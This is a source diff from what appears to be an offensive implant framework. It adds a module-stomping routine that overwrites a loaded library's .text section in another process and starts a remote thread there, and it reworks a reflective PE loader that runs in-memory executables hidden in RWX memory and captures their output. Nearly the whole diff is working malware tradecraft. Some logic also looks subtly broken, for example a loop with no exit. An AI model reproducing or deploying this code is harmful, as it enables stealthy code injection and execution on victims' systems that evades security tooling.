@@ -71,9 +71,112 @@ _KH_END:
     return Success;
 }
 
-// auto DECLFN Injection::Stomp(
+auto DECLFN Injection::Stomp(
+    _In_  ULONG   ProcessID,
+    _In_  PBYTE   Buffer,
+    _In_  UPTR    Size,
+    _In_  PVOID   Param,
+    _Out_ PVOID*  Base
+) -> BOOL {
+    HMODULE Modules[1024];
 
-// )
+    LONG    NtStatus   = STATUS_UNSUCCESSFUL;
+    PVOID   LibPtr     = nullptr;
+    PCHAR   LibName    = nullptr;
+    PVOID   FileBuff   = nullptr;
+    BOOL    Found      = FALSE;
+    ULONG   Needed     = 0;
+    ULONG   ThreadID   = 0;
+    ULONG   TextVirt   = 0;
+    ULONG   TextSize   = 0;
+    ULONG   FileSize   = 0;
+    SIZE_T  ViewSize   = 0;
+    ULONG   OldProt    = 0;
+    ULONG   Entrypoint = 0;
+    HANDLE  TdHandle   = INVALID_HANDLE_VALUE;
+    HANDLE  PsHandle   = INVALID_HANDLE_VALUE;
+    HANDLE  SecHandle  = INVALID_HANDLE_VALUE;
+    HANDLE  Transacted = INVALID_HANDLE_VALUE;
+    HANDLE  FileHandle = INVALID_HANDLE_VALUE;
+
+    PIMAGE_NT_HEADERS       Header = { 0 };
+    PIMAGE_SECTION_HEADER   SecHdr = { 0 };
+
+    // 
+    // open handle to the target process
+    //
+    PsHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, ProcessID );
+    if ( PsHandle == INVALID_HANDLE_VALUE ) return FALSE;
+
+    // 
+    // get random library if not loaded in the process
+    // 
+
+    do {
+        LibName = Self->Lib->GetRnd();
+
+        if ( Self->Krnl32.EnumProcessModules( PsHandle, Modules, sizeof( Modules ), &Needed ) ) {
+            for ( INT i = 0; i < ( Needed / sizeof( HMODULE ) ); i++ ) {
+                CHAR ModName[MAX_PATH] = { 0 };
+
+                Self->Krnl32.GetModuleFileNameExA( 
+                    PsHandle, Modules[i], ModName, ( sizeof( ModName ) / sizeof( CHAR ) ) 
+                );
+                
+                if ( Str::CompareA( ModName, LibName ) == 0 ) Found = TRUE;
+            }
+        }
+
+        if ( Found ) continue;
+
+        FileHandle = Self->Krnl32.CreateFileA( LibName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
+        if ( FileHandle == INVALID_HANDLE_VALUE ) return FALSE;
+
+        FileSize = Self->Krnl32.GetFileSize( FileHandle, 0 );
+        if ( !FileSize ) return FALSE;
+
+        FileBuff = Self->Hp->Alloc( FileSize );
+
+        Self->Krnl32.ReadFile( FileHandle, FileBuff, FileSize, 0, 0 );
+
+        Header = (PIMAGE_NT_HEADERS)( U_PTR( FileBuff ) + static_cast<PIMAGE_DOS_HEADER>( FileBuff )->e_lfanew );
+        SecHdr = IMAGE_FIRST_SECTION( Header );
+
+        Entrypoint = Header->OptionalHeader.AddressOfEntryPoint;
+
+        for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
+            CHAR SecName[8] = { 0 };
+
+            Mem::Copy( SecName, SecHdr[i].Name, 8 );
+
+            if ( Hsh::Str( SecName ) == Hsh::Str( ".text" ) ) {
+                if ( SecHdr[i].SizeOfRawData >= Size ) {
+                    TextVirt = SecHdr[i].VirtualAddress;
+                    TextSize = SecHdr[i].SizeOfRawData;
+                }
+            }
+        }
+
+    } while ( 1 );
+
+    KhDbg( "Module selected to stomping: %s", LibName );
+
+    NtStatus = Self->Mm->CreateSection( &SecHandle, SECTION_ALL_ACCESS, nullptr, 0, PAGE_READONLY, SEC_IMAGE, FileHandle );
+    if ( NtStatus != STATUS_SUCCESS ) return FALSE;
+
+    NtStatus = Self->Mm->MapView( SecHandle, NtCurrentProcess(), &LibPtr, 0, 0, 0, &ViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE );
+    if ( NtStatus != STATUS_SUCCESS ) return FALSE;
+
+    if ( !Self->Mm->Protect( PsHandle, (PVOID)( U_PTR( LibPtr ) + TextVirt ), TextSize, PAGE_READWRITE, &OldProt ) ) return FALSE;
+    
+    Mem::Copy( (PVOID)( U_PTR( LibPtr ) + TextVirt ), Buffer, Size );
+
+    TdHandle = Self->Td->Create( PsHandle, (PVOID)( U_PTR( LibPtr ) + TextVirt ), Param, 0, 0, &ThreadID );
+
+    KhDbg( "thread Created with PID: %d", ThreadID );
+
+    return TRUE;
+}
 
 auto DECLFN Injection::Reflection(
     _In_ PBYTE  Buffer,
@@ -98,43 +201,51 @@ auto DECLFN Injection::Reflection(
     PIMAGE_NT_HEADERS     Header = { 0 };
     PIMAGE_SECTION_HEADER SecHdr = { 0 };
     PIMAGE_DATA_DIRECTORY RelDir = { 0 };
+    PIMAGE_DATA_DIRECTORY ExpDir = { 0 };
+    PIMAGE_DATA_DIRECTORY TlsDir = { 0 };
     PIMAGE_DATA_DIRECTORY ImpDir = { 0 };
 
     Header = (PIMAGE_NT_HEADERS)( U_PTR( Buffer ) + ( (PIMAGE_DOS_HEADER)( Buffer ) )->e_lfanew );
     SecHdr = IMAGE_FIRST_SECTION( Header );
     RelDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+    ExpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+    TlsDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
     ImpDir = &Header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-
-    IsDll = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;
+    
+    ImgSize = Header->OptionalHeader.SizeOfImage;
+    IsDll   = Header->FileHeader.Characteristics & IMAGE_FILE_DLL;
 
     KhDbg( "parsed pe" );
     KhDbg( "is %s", IsDll ? "DLL" : "EXE" );
 
-    ImgBase = (PBYTE)Self->Mm->Alloc( 0, NULL, ImgSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
-
-    Delta = Header->OptionalHeader.ImageBase - U_PTR( ImgBase );
-    Size  = Header->OptionalHeader.SizeOfImage;
+    ImgBase = (PBYTE)Self->Mm->Alloc( nullptr, NULL, ImgSize, MEM_COMMIT | MEM_RESERVE, 0x40 );
+    Delta   = U_PTR( ImgBase ) - Header->OptionalHeader.ImageBase;
 
     KhDbg( "allocated to %p [%d bytes]", ImgBase, Size );
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
         Mem::Copy(
-            ImgBase + SecHdr[i].PointerToRawData,
-            Buffer  + SecHdr[i].VirtualAddress,
-            U_PTR( Buffer  + SecHdr[i].SizeOfRawData )
+            C_PTR( U_PTR( ImgBase)  + SecHdr[i].VirtualAddress ),
+            C_PTR( U_PTR( Buffer )  + SecHdr[i].PointerToRawData ),
+            SecHdr[i].SizeOfRawData
         );
     }
 
     KhDbg( "sections copied" );
 
     Self->Usf->FixImp( ImgBase, ImpDir );
+    KhDbg( "sections copied" );
     Self->Usf->FixRel( ImgBase, Delta, RelDir );
+    KhDbg( "sections copied" );
+    Self->Usf->FixExp( ImgBase, ExpDir );
+    KhDbg( "sections copied" );
+    // Self->Usf->FixTls( ImgBase, TlsDir );
 
-    KhDbg( "fixed imports and relocations" );
+    KhDbg( "fixed imports, exceptions and relocations" );
 
     for ( INT i = 0; i < Header->FileHeader.NumberOfSections; i++ ) {
         PVOID    SectionPtr       = ( ImgBase + SecHdr[i].VirtualAddress );
-        SIZE_T   SectionSize      = SecHdr[i].SizeOfRawData;;
+        SIZE_T   SectionSize      = SecHdr[i].SizeOfRawData;
         ULONG    MemoryProtection = 0;
         ULONG    OldProtection    = 0;
 		
@@ -159,7 +270,7 @@ auto DECLFN Injection::Reflection(
 		if ( ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( SecHdr[i].Characteristics & IMAGE_SCN_MEM_READ ) )
 			MemoryProtection = PAGE_EXECUTE_READWRITE;
 
-        if ( !( Self->Mm->Protect( NtCurrentProcess(), &SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return FALSE; }
+        if ( !( Self->Mm->Protect( NtCurrentProcess(), SectionPtr, SectionSize, MemoryProtection, &OldProtection ) ) ) { return FALSE; }
     }
 
     KhDbg( "fixed sections memory protections" );
@@ -181,8 +292,6 @@ auto DECLFN Injection::Reflection(
     BackupOut = Self->Krnl32.GetStdHandle( STD_OUTPUT_HANDLE );
     Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, PipeWrite );
 
-    KhDbg( "starting execution of the pe" );
-
     if ( IsDll ) {
         BOOL ( *KDllMain )( PVOID, ULONG, PVOID ) = decltype( KDllMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
         KDllMain( ImgBase, DLL_PROCESS_ATTACH, NULL );
@@ -192,8 +301,13 @@ auto DECLFN Injection::Reflection(
             KWinMain( ImgBase, Self->Session.Base.Start, Param, SW_HIDE );
         } else if ( Header->OptionalHeader.Subsystem == 3 ) {
             INT ( *KMain )( INT, PWCH* ) = decltype( KMain )( ImgBase + Header->OptionalHeader.AddressOfEntryPoint );
-            Argv = Self->Shell32.CommandLineToArgvW( W_PTR( Param ), &Argc );
-            KMain( Argc, Argv );
+
+            if ( Param ) {
+                Argv = Self->Shell32.CommandLineToArgvW( W_PTR( Param ), &Argc );
+                KMain( Argc, Argv );
+            } else {
+                KMain( Argc, Argv );
+            }
         }
     }
 
@@ -201,6 +315,8 @@ auto DECLFN Injection::Reflection(
 
     this->Ctx.Pipe.p = Self->Hp->Alloc( PIPE_BUFFER_LENGTH );
     Self->Krnl32.ReadFile( PipeRead, this->Ctx.Pipe.p, PIPE_BUFFER_LENGTH, Reads, 0 );
+
+    KhDbg( "reads %d %p", Reads, this->Ctx.Pipe.p );
 
 _KH_END:
     if ( ImgBase ) {
